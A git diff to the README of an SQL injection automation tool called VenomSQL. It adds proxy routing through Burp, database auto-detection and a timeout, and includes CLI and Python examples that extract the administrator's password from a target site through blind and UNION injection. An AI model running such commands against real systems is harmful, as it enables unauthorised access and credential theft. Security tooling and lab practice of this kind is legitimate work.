@@ -15,6 +15,9 @@ Modular SQL injection automation tool.
 - **Auto password length detection** — detects length before brute forcing
 - **Binary search extraction** — ~7 requests per character instead of 70+ (brute force)
 - **CLI support** — runnable via `python -m VenomSQL`
+- **Proxy support** — route traffic through Burp Suite or any HTTP proxy
+- **Auto-detect DB** — fingerprint the backend database automatically
+- **Request timeout** — configurable timeout to prevent hanging requests
 
 ## Project Structure
 
@@ -28,6 +31,7 @@ VenomSQL/
 ├── blindBoolean.py  # Blind SQLi (boolean-based) module
 ├── blindTime.py     # Blind SQLi (time-based) module
 ├── unionBased.py    # UNION-based SQLi module
+├── detectDb.py      # Auto-detect database type module
 ├── README.md        # Documentation
 └── .gitignore
 ```
@@ -47,7 +51,9 @@ sqli = BlindErrorBased(
     inject_point=inject_point,
     targetTable="users",
     db_type="oracle",
-    extra_cookies=extra_cookies
+    extra_cookies=extra_cookies,
+    proxy="http://127.0.0.1:8080",  # optional — route through Burp
+    verify=False,                    # optional — skip SSL verification
 )
 
 sqli.extract(column="password", username="administrator")
@@ -67,6 +73,25 @@ python -m VenomSQL \
   --column password \
   --username administrator \
   --signal "Welcome back!"
+```
+
+With proxy (Burp Suite):
+
+```bash
+python -m VenomSQL \
+  --url "https://target.com" \
+  --technique blind-boolean \
+  --db oracle \
+  --proxy http://127.0.0.1:8080
+```
+
+Auto-detect database type:
+
+```bash
+python -m VenomSQL \
+  --url "https://target.com" \
+  --technique union \
+  --db auto
 ```
 
 For UNION enumeration:
@@ -105,5 +130,6 @@ The project is largely up to date with the current codebase:
 - [x] Binary search per character (~7 requests instead of 70+)
 - [x] UNION-based SQLi
 - [x] CLI interface
-- [ ] Proxy support (route through Burp)
-- [ ] Auto-detect DB type
+- [x] Proxy support (route through Burp)
+- [x] Auto-detect DB type
+- [x] Request timeout
